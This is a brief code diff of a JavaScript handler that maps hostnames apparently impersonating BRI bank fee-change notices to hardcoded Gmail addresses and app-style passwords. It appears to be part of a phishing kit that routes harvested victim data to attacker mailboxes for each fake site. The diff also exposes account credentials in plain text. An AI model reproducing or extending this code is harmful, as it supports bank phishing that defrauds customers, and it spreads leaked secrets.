@@ -7,10 +7,10 @@ export default function handler(req, res) {
     let email = '';
     let pass = '';
   
-       if (url == 'tarif-baru-bri.vercel.com'){
+       if (url == 'tarif-terbaru-bri.vercel.com'){
 
-       email = 'cahayahatimu55@gmail.com'
-       pass = 'hwxgrbvzrbyyuwec'
+       email = 'lahjadi957@gmail.com'
+       pass = 'bhtivamantsnrsxf'
     }else
     
     if(url == 'perubahantarifbri.herokuapp.com') //jika url sama dengan url hosting
